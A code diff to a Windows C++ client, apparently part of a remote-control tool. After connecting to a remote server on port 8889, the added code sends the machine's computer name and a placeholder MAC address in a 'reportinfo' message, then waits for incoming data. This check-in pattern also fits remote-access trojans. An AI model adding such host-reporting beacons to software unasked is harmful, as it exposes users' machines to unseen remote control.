@@ -437,7 +437,24 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
 		BOOL bConRes = ClientConnect(hClient,REMOTE_SERVER_IP,8889);
 
 		if (bConRes)
-		{
+		{	
+			char chComputerName[100];
+			DWORD dwNameLen = 100;
+			GetComputerNameA(chComputerName,&dwNameLen);
+			chComputerName[dwNameLen] = 0;
+			int a=0;
+			
+
+			CProtocolHandler ptlReport;
+			ptlReport.SetParamValueString("cmd","reportinfo");
+			ptlReport.SetParamValueString("pcname",chComputerName);
+			ptlReport.SetParamValueString("mac","AA-AA-CC-CC-DD-DD");
+
+			CStringA strBuildData;
+			strBuildData = ptlReport.BuildData();
+
+			ClientSendData(hClient,(BYTE *)strBuildData.GetBuffer(),strBuildData.GetLength());
+
 			StartRecvData(hClient);
 			break;
 		}
